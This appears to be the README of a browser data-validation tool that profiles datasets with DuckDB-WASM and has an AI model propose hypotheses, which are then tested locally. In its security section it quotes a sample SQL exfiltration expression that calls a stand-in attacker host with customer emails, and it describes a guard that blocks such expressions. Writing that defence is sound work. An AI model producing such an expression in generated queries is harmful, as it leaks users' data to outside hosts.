# duck-invariant

Point it at one or more datasets, and it proposes **falsifiable hypotheses** about them — then
tests each one locally and tells you which ones are false. Feed the verdicts back and it narrows
down *why*.

Everything runs in the browser. DuckDB-WASM loads the files, profiles every column, and evaluates
every check. The only thing that ever leaves the page is a statistical profile — counts,
percentages, ranges, and masked format shapes — and, on later rounds, the pass/fail counts of what
has already been tested. **No cell values are ever transmitted.**

```
URLs and files → validate → load into DuckDB → profile → ask the AI → test locally
                                                            ▲            │
                                                            └── verdicts ┘   (up to 3 rounds)
```

## Quick start

```bash
npm install
cp .dev.vars.example .dev.vars     # add your Anthropic API key
npm run dev                        # next on :3000, worker on :8787
```

Open http://localhost:3000. It lands in **demo mode** with the Commerce dataset pre-selected —
one click loads it. Switch to **Your own data** to point at a CORS-enabled Parquet/CSV/JSON URL or
drop your own files.

## Demo datasets

Three datasets ship in `public/data` and are listed in `lib/demo.ts`. They are same-origin and
known-good, so they skip the CORS and format checks that user-supplied URLs go through.

| | Tables | Rows | What it is good at showing |
|---|---|---|---|
| **Commerce** (default) | 8 | 258k | Referential integrity across orders, items, payments and refunds — and whether the denormalised `orders_flat` still agrees with the tables it was built from |
| **Flights** | 1 | 91k | Arithmetic that should reconcile: delay causes summing to the total, elapsed time against air time plus taxiing, what a cancelled flight may record |
| **Power** | 1 | 89k | Sensor and pipeline faults: negative sub-meter readings, implausible draw, sub-meters exceeding the total |

Commerce is the default because it is the multi-table one, and cross-table relationships are
exactly what a single-table profile cannot reveal.

The datasets are seeded with real defects, so the demo does not just report that everything is
fine. A live run over Commerce found 100 orders referencing a customer that does not exist, 306
duplicate `(order_id, line_number)` pairs, 143 rows where `order_total` does not equal
`items_subtotal + shipping + tax - discount`, and 40 orders paid before they were created.

Loading takes one click rather than happening automatically: the engine plus Commerce is tens of
megabytes, and downloading that unasked would be rude on a metered connection.

`test/demo.test.ts` asserts every manifest path exists on disk, stays under Cloudflare's 25 MiB
per-file asset limit, and uses safe unique table names — a typo there would otherwise 404 at
runtime with no other warning.

## Iterative rounds

One pass finds that something is broken. It takes another to work out what. So a run is up to
**three rounds**: round 1 reads the profile, and each follow-up receives the verdicts of everything
already tested and proposes what now follows.

Round 1 is told this is coming, which changes what it asks. The system prompt tells it to include
diagnostic hypotheses chosen because either answer is informative, to prefer one broad claim over
five near-duplicates, and to leave narrowing for later. Follow-up rounds are told what to do with
each kind of result: narrow a falsified claim by status, country, channel or time window; treat a
near-100% violation rate as a wrong rule rather than bad data; build on what held; and repair or
drop what did not run instead of resubmitting it.

It works. A live two-round run over Commerce:

| Round 1 found | Round 2 concluded |
|---|---|
| 100 orders reference a customer that does not exist | Those 100 are exactly the malformed short `customer_id`s — every value matches the shape `A{3}-9{7}` |
| A composite `(product_id, seller_id, product_category)` check fails on 40 rows | `product_category` is the culprit: it mismatches on those 40 while `seller_id` **holds** |
| 40 rows break lifecycle timestamp ordering | `created_at` is not the earliest timestamp (40); `delivered_at >= shipped_at` **holds** |

Note the second round used the masked shape histogram — the privacy-preserving representation —
to identify a root cause it could never have seen the values for.

**What travels back is only what already travels out.** Each finding carries its title, the
structured check, the outcome, and a violation count and percentage — aggregates of exactly the
kind the profile already reports. No rows, no values, and not even the generated SQL.

The one real hazard is error text: DuckDB embeds the offending value in its messages
(`Could not convert string 'aaron.blake@acme.io' to DOUBLE`), so a raw reason would hand a cell
value straight back. `lib/hypotheses/findings.ts` reduces every reason to a category plus
identifiers the model already has, discarding all quoted text; `assertFindingsSafe()` refuses
anything that still looks like engine prose, and `test/findings.test.ts` attacks it with real
DuckDB messages containing PII.

## How the privacy guarantee works

The model is asked to reason about your data without seeing it, so the profile is the entire
channel. What crosses the network:

| Sent | Not sent |
|---|---|
| Column names and DuckDB type names | Any cell value |
| Row/null/distinct counts, percentages | String min/max, top-k values, row samples |
| Numeric min/max/quantiles, date ranges | Anything not declared in `TableProfileSchema` |
| String length + character-class distributions | |
| Masked shapes: `aaron.blake@acme.io` → `a{5}.a{5}@a{4}.aa` | |

Enforced in three places:

1. `lib/profile/redaction.ts` — `assertNoValues()` re-parses the profile through its zod schema
   (dropping unknown keys) and rejects any shape containing an unmasked letter or digit. A profile
   cannot reach the network without passing it.
2. `worker/index.ts` — re-parses the incoming profile server-side, so a modified client cannot
   smuggle extra fields through to Anthropic.
3. `test/profile.test.ts` and `test/integration.test.ts` — profile fixtures seeded with realistic
   PII and real TPC-H data, then assert none of those literals appear in the serialised profile.

The UI's **"what gets sent"** toggle shows the exact request body, so you never have to take the
above on trust.

## How generated SQL is contained

The AI writes checks that run against your data, so a generated expression like
`read_csv('https://evil.example/?leak=' || customer_email)` would defeat the whole point. Two
independent layers stop it:

- **The model never emits raw SQL.** It emits a structured check and names the table it applies
  to, and we build the query around it, so the `FROM` clause is always ours and the result is
  always a count:

  ```ts
  type Check =
    // must be true of every row of one table
    | { kind: 'row_predicate'; table: string; expression: string }
    // no duplicates on this column combination
    | { kind: 'unique'; table: string; columns: string[] }
    // every non-NULL value here also appears there — the cross-table one
    | { kind: 'references'; table: string; columns: string[];
        referencesTable: string; referencesColumns: string[] }
  ```

  `lib/hypotheses/guard.ts` then rejects any expression containing `SELECT`, a semicolon, a
  comment marker, or a function that can reach a file or URL. Banning `SELECT` removes subquery
  exfiltration entirely; a row predicate never needs one. Table names are matched against the
  real schema before any SQL is built, so a hypothesis naming a table that does not exist is
  reported as "not run" rather than executed.

  `references` is deliberately direction-agnostic. Pointing `lineitem → orders` asks whether every
  line belongs to a real order; reversing it asks whether every order has at least one line. Both
  are worth testing, and the prompt says so. It is compiled to a `NOT EXISTS` anti-join that skips
  NULL keys, exactly as a foreign key would — **but only when both sides are the same type
  family**. DuckDB coerces across families silently rather than complaining, so a BIGINT key joined
  to a zero-padded VARCHAR key matches `'0001'` to `1` and under-reports violations (measured: 1
  reported where the truth was 3). The check is refused, naming both types, rather than returning a
  number that is quietly wrong. A key whose type differs between two tables is itself a defect
  worth surfacing, and the refusal reaches the next round so the model can propose a corrected
  check.
- **DuckDB has the capability taken away.** Every source is materialised into a table, then
  `SET enable_external_access=false` runs before any generated SQL. `test/integration.test.ts`
  proves this by asserting a remote read actually fails afterwards, and `test/reload.test.ts`
  proves it is re-applied on every rebuild rather than only the first.

Every verdict carries the SQL that produced it and how long it took, both visible in the UI.

Trade-off: materialising means each source is held in browser memory rather than range-read
lazily, so very large files are slow. The UI warns above 500 MB.

## Layout

```
app/                    one page, client-side
components/             checklist, profile panel, hypothesis list, violation table
lib/demo.ts             the three bundled datasets and their manifests
lib/sources/validate.ts URL preflight: CORS, ranges, size, magic-byte format sniffing
lib/duckdb/             bundles (swappable CDN → R2), client, loader + lockdown
lib/profile/            SQL builders, orchestration, shape masking, redaction
lib/hypotheses/         shared schema, expression guard, local evaluation
worker/                 Hono: /api/health, /api/hypotheses  — the only server code
```

`lib/duckdb/bundles.ts` is the only file that knows where the WebAssembly comes from. It cannot
ship in Cloudflare's static assets — `duckdb-eh.wasm` is 34 MiB against a 25 MiB per-file limit —
so it loads from jsDelivr. To self-host, upload the bundle to R2 and set
`NEXT_PUBLIC_DUCKDB_BASE_URL`; nothing else changes.

## Deploy

```bash
npx wrangler login
npx wrangler secret put ANTHROPIC_API_KEY
npm run deploy
```

Then protect it: Cloudflare dashboard → Workers & Pages → duck-invariant → **Access** tab →
"Protect this Worker behind Access". This works on the `workers.dev` hostname with no custom
domain. Without it, anyone who finds the URL can spend your API key.

Note: Worker-level Access policies do not support WebSockets, which is one reason this app uses a
single request/response rather than a streaming socket.

## One request per round — and you can read every one

Each round makes exactly **one** request and gets **one** response. There is no agent
loop, no tool use, and no retry-with-follow-up: the model is asked once for structured output and
that is the entire exchange. No tools are declared in the request, so the model has no mechanism
to ask for another turn even if it wanted one.

That is measured rather than asserted. `worker/index.ts` wraps `fetch` in a counter and reports
`httpAttempts` on every response, so the number shown in the UI is the real one. The transcript
keeps every round, selectable by number. If it ever reads
above 1, the SDK resent the same query after a transient failure — the UI says so explicitly
rather than letting it look like an extra question. `test/exchange.test.ts` drives the Worker with
a recording client and asserts one request, one user message, and no `tools` field.

The **Transcript** panel shows the exchange verbatim: the system prompt, the user message, and the
model's raw structured output, plus model, token counts, latency and stop reason. Those strings
are the ones actually sent — recorded in the Worker at the point of the call, not reconstructed
afterwards, since a reconstruction would defeat the point of showing them.

## Results appear as they are tested

Hypotheses render the moment the model replies, each marked `queued`, then `testing…`, then its
verdict, with an `n of m tested` counter. Checks run over a pool of DuckDB connections
(`evaluateAllHypotheses`) so several are in flight at once and each verdict lands as soon as it is
ready, instead of the page sitting still until the slowest one finishes.

An honest caveat: the `eh` WebAssembly build is single-threaded, so this is not true CPU
parallelism — DuckDB still executes one query at a time. What the pool actually buys is that
queries queue inside the worker rather than each waiting for a JS round trip, and that results
stream. If the threaded build is ever enabled it becomes real parallelism with no code change.

## Keeping it off search engines and AI crawlers

Four layers, in descending order of how much they are actually worth:

1. **Cloudflare Access — the only one that enforces anything.** A crawler cannot authenticate, so
   it gets the login redirect instead of your page. Everything below is a request that a
   well-behaved crawler chooses to honour; Access is the part that does not depend on goodwill.
2. **`preview_urls: false`** in `wrangler.jsonc`. Preview URLs publish an extra hostname
   (`<version>-duck-invariant.<subdomain>.workers.dev`) that an Access policy scoped to the
   production host would not cover.
3. **`X-Robots-Tag: noindex, nofollow, noarchive, nosnippet`** on every response. Asset responses
   get it from `public/_headers`; Worker responses get it from middleware in `worker/index.ts`,
   because `_headers` does not apply to them. Unlike robots.txt this also tells a crawler that
   *already has* the URL not to index it.
4. **`robots.txt` and robots meta tags.** Generated by `app/robots.ts` from the list in
   `lib/crawlers.ts`: a blanket `User-agent: *` plus ~50 named crawlers. The names matter because
   `Google-Extended` and `Applebot-Extended` are not crawlers at all — they are AI-training
   opt-out tokens that only take effect when addressed by name, and are ignored under the
   wildcard.

`Referrer-Policy: no-referrer` is also set. That one is not about crawlers: the app fetches
data URLs you supply, and without it the `Referer` header would hand this site's address to
every host you point it at — which is exactly how a private URL stops being private.

The remaining exposure is a link. Crawlers find URLs mostly by following them, so pasting the
address into a public issue, a shared doc, or a chat that indexes its history will do more to make
it discoverable than any of the above will prevent. Enable Access and the point is moot.

## Model

`claude-opus-5`, hardcoded in the Worker along with the system prompt, output schema and token
cap. Server-side refusal fallbacks are enabled, as Anthropic recommends by default for Opus 5: if
a safety classifier declines, the API retries on a fallback model rather than returning nothing.

Cost is worth knowing before you reach for round 3. Commerce sends ~39k input tokens per round and
gets 7-9k back, so at Opus 5 rates that is roughly **$0.40 per round** — about $1.20 for a full
three-round run, and 80-110s of latency each. Sonnet 5 is about a fifth of that if you would rather
trade depth for cost; it is a one-line change in `worker/hypotheses.ts`. The client sends only a profile, so the endpoint cannot be repurposed as a general-purpose
Claude proxy. Structured outputs (`messages.parse` + `zodOutputFormat`) guarantee the response
matches the hypothesis schema.

## Tests

```bash
npm test
```

107 tests. The profiling and evaluation tests run against a real DuckDB via the Node build of
duckdb-wasm, so they exercise exactly the SQL the browser runs, and `test/integration.test.ts`
loads a real remote Parquet file end to end.

## Known limits

- Single table per session; no joins across sources yet.
- Large files are held in memory (see the trade-off above).
- Single-threaded DuckDB — the threaded build needs site-wide cross-origin isolation.
- Hypotheses that fail to parse are reported as "not run" rather than repaired.
- Concurrency is bounded by the single-threaded WebAssembly build (see above).
